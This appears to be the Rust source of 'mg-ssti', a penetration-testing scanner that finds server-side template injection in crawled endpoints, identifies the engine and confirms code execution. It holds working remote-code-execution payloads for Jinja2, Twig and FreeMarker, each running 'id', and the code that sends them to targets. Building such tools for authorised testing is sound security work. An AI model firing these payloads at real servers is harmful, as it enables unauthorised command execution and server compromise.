/*******************************************************************
 * Filename:        main.rs
 * Author:          Jeff
 * Date:            2026-05-17
 * Description:     mg-ssti — Server-Side Template Injection detection
 *                  Probes GET params and POST fields from crawl corpus,
 *                  identifies template engine, attempts RCE verification.
 * Notes:           Engine identification uses the 7*7 / 7*'7' matrix.
 *                  RCE payloads look for id command output in response.
 *                  Skips cleanly when crawl dir is absent.
 *******************************************************************/

use std::fs;
use std::path::Path;
use std::time::Duration;

use anyhow::{Context, Result};
use clap::Parser;
use serde::{Deserialize, Serialize};
use time::OffsetDateTime;
use time::format_description::well_known::Rfc3339;
use tokio::task::JoinSet;

use engagement::Engagement;

// ── Constants ────────────────────────────────────────────────────────────────

const OUTPUT_SUBDIR: &str = "ssti";
const AUDIT_TOOL: &str = "mg-ssti";

// Math probes: value → expected result string(s)
const PROBE_CURLY: &str = "{{7*7}}";
const PROBE_DOLLAR: &str = "${7*7}";
const PROBE_ERB: &str = "<%= 7*7 %>";
const PROBE_HASH: &str = "#{7*7}";
const PROBE_STAR: &str = "*{7*7}";
const PROBE_TWIG_JINJA: &str = "{{7*'7'}}";

const EXPECT_49: &str = "49";
const EXPECT_JINJA2: &str = "7777777";

// RCE verification payloads per engine
const RCE_JINJA2: &str =
    "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}";
const RCE_TWIG: &str =
    "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}";
const RCE_FREEMARKER: &str =
    "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}";

// RCE confirmation strings
const RCE_INDICATOR_UID: &str = "uid=";
const RCE_INDICATOR_ROOT: &str = "root";

// ── CLI ──────────────────────────────────────────────────────────────────────

#[derive(Parser, Debug)]
#[command(
    name = "mg-ssti",
    about = "SSTI detection — template injection via crawl corpus"
)]
struct Args {
    /// Engagement name (must have crawl output)
    engagement: String,

    /// Engagements root directory
    #[arg(long, env = "MG_ENGAGEMENTS_DIR", default_value = "engagements")]
    engagements_dir: String,

    /// Maximum concurrent injection requests
    #[arg(long, default_value_t = 8)]
    concurrency: usize,

    /// HTTP timeout in seconds
    #[arg(long, default_value_t = 15)]
    timeout: u64,
}

// ── Data types ───────────────────────────────────────────────────────────────

// Mirrors the EndpointMatch shape written by mg-crawl
#[derive(Deserialize)]
struct EndpointMatch {
    path: String,
    #[serde(default)]
    params: Vec<String>,
    #[serde(default = "default_method")]
    method: String,
}

// Template engine identified from probes
#[derive(Debug, Clone, Serialize, PartialEq, Eq)]
enum Engine {
    Jinja2,
    Twig,
    FreeMarkerVelocity,
    ErbEjs,
    Unknown,
}

// Severity of a finding
#[derive(Debug, Clone, Serialize, PartialEq, Eq)]
enum Severity {
    High,
    Medium,
}

// One confirmed SSTI finding
#[derive(Debug, Serialize)]
struct SstiResult {
    url: String,
    param: String,
    method: String,
    engine: Engine,
    rce_confirmed: bool,
    severity: Severity,
    evidence: String,
}

// Top-level output written to disk
#[derive(Serialize)]
struct SstiResults {
    engagement: String,
    timestamp: String,
    total_probes: usize,
    confirmed: usize,
    results: Vec<SstiResult>,
}

// ── Helpers ──────────────────────────────────────────────────────────────────

// Return default HTTP method for deserialization
fn default_method() -> String {
    "GET".to_string()
}

// Return current UTC timestamp as RFC 3339
fn now_rfc3339() -> String {
    OffsetDateTime::now_utc()
        .format(&Rfc3339)
        .unwrap_or_else(|_| "unknown".into())
}

// Sanitize a timestamp string for use in a filename (colons → underscores)
fn ts_for_filename(ts: &str) -> String {
    ts.chars()
        .map(|c| if c == ':' { '_' } else { c })
        .collect()
}

// Collect injectable endpoints from crawl host subdirectories
fn collect_endpoints(crawl_dir: &Path) -> Vec<EndpointMatch> {
    let mut endpoints = Vec::new();
    let Ok(hosts) = fs::read_dir(crawl_dir) else {
        return endpoints;
    };
    for entry in hosts.flatten() {
        if !entry.file_type().map(|t| t.is_dir()).unwrap_or(false) {
            continue;
        }
        let ep_path = entry.path().join("endpoints.json");
        let Ok(raw) = fs::read_to_string(&ep_path) else {
            continue;
        };
        let Ok(eps): Result<Vec<EndpointMatch>, _> = serde_json::from_str(&raw) else {
            continue;
        };
        for ep in eps {
            if (ep.method == "GET" || ep.method == "POST") && !ep.params.is_empty() {
                endpoints.push(ep);
            }
        }
    }
    endpoints
}

// Send a single probe value for a param and return the response body
async fn send_probe(
    client: &reqwest::Client,
    url: &str,
    param: &str,
    method: &str,
    probe: &str,
) -> String {
    let clean = url.split('?').next().unwrap_or(url);
    let result = if method == "POST" {
        client
            .post(clean)
            .header("Content-Type", "application/x-www-form-urlencoded")
            .body(format!("{param}={probe}"))
            .send()
            .await
    } else {
        client
            .get(format!("{clean}?{param}={probe}"))
            .send()
            .await
    };
    match result {
        Ok(r) => r.text().await.unwrap_or_default(),
        Err(_) => String::new(),
    }
}

// Probe one (url, param, method) triple and return an optional SstiResult
async fn probe_endpoint(
    client: reqwest::Client,
    url: String,
    param: String,
    method: String,
) -> Option<SstiResult> {
    // Phase 1: send curly probe and twig/jinja discriminator
    let body_curly = send_probe(&client, &url, &param, &method, PROBE_CURLY).await;
    let body_twig_jinja = send_probe(&client, &url, &param, &method, PROBE_TWIG_JINJA).await;
    let body_dollar = send_probe(&client, &url, &param, &method, PROBE_DOLLAR).await;
    let body_erb = send_probe(&client, &url, &param, &method, PROBE_ERB).await;

    // Identify engine from probe responses
    let engine = identify_engine(
        &body_curly,
        &body_twig_jinja,
        &body_dollar,
        &body_erb,
    );

    if engine == Engine::Unknown {
        // Also check hash and star probes
        let body_hash = send_probe(&client, &url, &param, &method, PROBE_HASH).await;
        let body_star = send_probe(&client, &url, &param, &method, PROBE_STAR).await;
        if !body_hash.contains(EXPECT_49) && !body_star.contains(EXPECT_49) {
            return None;
        }
        // One of hash or star matched — treat as unknown engine but medium severity
        return Some(SstiResult {
            url,
            param,
            method,
            engine: Engine::Unknown,
            rce_confirmed: false,
            severity: Severity::Medium,
            evidence: EXPECT_49.into(),
        });
    }

    // Phase 2: attempt RCE verification for identified engines
    let (rce_payload, evidence_base) = match &engine {
        Engine::Jinja2 => (RCE_JINJA2, "jinja2"),
        Engine::Twig => (RCE_TWIG, "twig"),
        Engine::FreeMarkerVelocity => (RCE_FREEMARKER, "freemarker"),
        Engine::ErbEjs => {
            // No RCE payload defined for ERB/EJS — report as medium
            return Some(SstiResult {
                url,
                param,
                method,
                engine,
                rce_confirmed: false,
                severity: Severity::Medium,
                evidence: EXPECT_49.into(),
            });
        }
        Engine::Unknown => unreachable!(),
    };

    let body_rce = send_probe(&client, &url, &param, &method, rce_payload).await;
    let rce_confirmed =
        body_rce.contains(RCE_INDICATOR_UID) || body_rce.contains(RCE_INDICATOR_ROOT);

    let severity = if rce_confirmed {
        Severity::High
    } else {
        Severity::Medium
    };

    Some(SstiResult {
        url,
        param,
        method,
        engine,
        rce_confirmed,
        severity,
        evidence: evidence_base.into(),
    })
}

// Determine which engine based on math probe responses
fn identify_engine(
    body_curly: &str,
    body_twig_jinja: &str,
    body_dollar: &str,
    body_erb: &str,
) -> Engine {
    // Jinja2: {{7*7}}→49 AND {{7*'7'}}→7777777
    if body_curly.contains(EXPECT_49) && body_twig_jinja.contains(EXPECT_JINJA2) {
        return Engine::Jinja2;
    }
    // Twig: {{7*7}}→49 AND {{7*'7'}}→49
    if body_curly.contains(EXPECT_49) && body_twig_jinja.contains(EXPECT_49) {
        return Engine::Twig;
    }
    // FreeMarker/Velocity: ${7*7}→49
    if body_dollar.contains(EXPECT_49) {
        return Engine::FreeMarkerVelocity;
    }
    // ERB/EJS: <%= 7*7 %>→49
    if body_erb.contains(EXPECT_49) {
        return Engine::ErbEjs;
    }
    Engine::Unknown
}

// ── Entry point ──────────────────────────────────────────────────────────────

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();

    let eng = Engagement::load_named(Path::new(&args.engagements_dir), &args.engagement)
        .with_context(|| format!("load engagement {}", args.engagement))?;

    let crawl_dir = eng.crawl_dir();
    if !crawl_dir.exists() {
        eprintln!(
            "mg-ssti: crawl dir absent — run `mg-crawl {}` first, skipping",
            args.engagement
        );
        return Ok(());
    }

    let endpoints = collect_endpoints(&crawl_dir);
    if endpoints.is_empty() {
        eprintln!(
            "mg-ssti: no injectable endpoints found — run `mg-crawl {}` first",
            args.engagement
        );
        return Ok(());
    }

    eprintln!(
        "mg-ssti: {} injectable endpoints, concurrency={}",
        endpoints.len(),
        args.concurrency
    );

    let auth_headers = session::get_auth_headers(&eng)
        .await
        .context("load session auth headers")?;

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(args.timeout))
        .default_headers(auth_headers)
        .danger_accept_invalid_certs(true)
        .build()
        .context("build HTTP client")?;

    let mut join_set: JoinSet<Option<SstiResult>> = JoinSet::new();
    let mut all_results: Vec<SstiResult> = Vec::new();
    let mut total_probes: usize = 0;

    for ep in &endpoints {
        for param in &ep.params {
            // Drain when at concurrency ceiling
            if join_set.len() >= args.concurrency
                && let Some(Ok(Some(finding))) = join_set.join_next().await
            {
                all_results.push(finding);
            }

            total_probes += 1;
            let c = client.clone();
            let url = ep.path.clone();
            let p = param.clone();
            let m = ep.method.clone();
            join_set.spawn(probe_endpoint(c, url, p, m));
        }
    }

    // Drain remaining tasks
    while let Some(Ok(r)) = join_set.join_next().await {
        if let Some(finding) = r {
            all_results.push(finding);
        }
    }

    // Print confirmed hits
    for r in &all_results {
        let rce_tag = if r.rce_confirmed { " [RCE]" } else { "" };
        eprintln!(
            "  [SSTI{rce_tag}] {} param={} engine={:?}",
            r.url, r.param, r.engine
        );
    }

    let ts = now_rfc3339();
    let ts_file = ts_for_filename(&ts);

    let output = SstiResults {
        engagement: args.engagement.clone(),
        timestamp: ts.clone(),
        total_probes,
        confirmed: all_results.len(),
        results: all_results,
    };

    let output_dir = eng.root.join(OUTPUT_SUBDIR);
    fs::create_dir_all(&output_dir).context("create ssti output dir")?;

    let results_path = output_dir.join(format!("results-{ts_file}.json"));
    fs::write(
        &results_path,
        serde_json::to_string_pretty(&output).unwrap_or_default(),
    )
    .context("write SSTI results JSON")?;

    eprintln!(
        "mg-ssti: {} probes, {} confirmed — {}",
        output.total_probes,
        output.confirmed,
        results_path.display()
    );

    let _ = eng.audit(
        AUDIT_TOOL,
        &eng.meta.target,
        Some(&format!(
            "probes={} confirmed={} ts={ts}",
            output.total_probes, output.confirmed
        )),
    );

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn identify_jinja2_from_7777777() {
        let engine = identify_engine("result=49 ok", "got 7777777", "", "");
        assert_eq!(engine, Engine::Jinja2);
    }

    #[test]
    fn identify_twig_when_both_return_49() {
        let engine = identify_engine("result=49 ok", "result=49 ok", "", "");
        assert_eq!(engine, Engine::Twig);
    }

    #[test]
    fn identify_freemarker_from_dollar_probe() {
        let engine = identify_engine("no match", "no match", "value=49 done", "");
        assert_eq!(engine, Engine::FreeMarkerVelocity);
    }

    #[test]
    fn identify_erb_from_erb_probe() {
        let engine = identify_engine("no match", "no match", "no match", "output 49 ok");
        assert_eq!(engine, Engine::ErbEjs);
    }

    #[test]
    fn identify_unknown_when_no_probe_matches() {
        let engine = identify_engine("nothing", "nothing", "nothing", "nothing");
        assert_eq!(engine, Engine::Unknown);
    }

    #[test]
    fn ts_for_filename_replaces_colons() {
        let ts = "2026-05-17T12:34:56Z";
        assert_eq!(ts_for_filename(ts), "2026-05-17T12_34_56Z");
    }

    #[test]
    fn collect_endpoints_returns_empty_for_missing_dir() {
        let dir = Path::new("/tmp/mg-ssti-no-such-dir-xyz");
        let eps = collect_endpoints(dir);
        assert!(eps.is_empty());
    }
}
